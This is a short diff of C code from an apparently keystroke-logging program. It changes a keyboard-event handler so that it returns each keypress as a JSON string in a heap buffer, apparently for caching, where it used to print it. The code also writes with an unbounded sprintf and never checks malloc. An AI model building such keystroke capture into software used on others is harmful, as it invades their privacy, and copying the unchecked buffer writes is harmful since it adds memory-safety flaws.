@@ -1,9 +1,13 @@
 #include "process.h"
 #include "vk_names.h"
 #include <stdio.h>
+#include <stdlib.h>
 #include <tlhelp32.h>
 
-void process_kbd_event(int keyup, int vk) {
+extern int MAX_CACHED_KEYPRESSES;
+extern int KEYPRESS_LOG_MAX_SIZE;
+
+char *process_kbd_event(int keyup, int vk) {
   /* klg_ctx_t ctx = get_context(); */
 
   /* fprintf(stdout, */
@@ -12,8 +16,10 @@ void process_kbd_event(int keyup, int vk) {
   /*         ctx.time, ctx.klid, keyup ? 1 : 0, vsc, e0 ? 1 : 0, e1 ? 1 : 0, vk,
    */
   /*         VKN(vk)); */
-  fprintf(stdout, "{ \"keyup\": %d,\"vk\": %d, \"vkn\": \"%s\" }\n",
-          keyup ? 1 : 0, vk, VKN(vk));
+  char *buf = (char *)malloc(sizeof(char) * KEYPRESS_LOG_MAX_SIZE);
+  sprintf(buf, "\n{\"keyup\": %d,\"vk\": %d, \"vkn\": \"%s\"}", keyup ? 1 : 0,
+          vk, VKN(vk));
+  return buf;
 }
 
 // gets the process name (.exe) for input *pid*
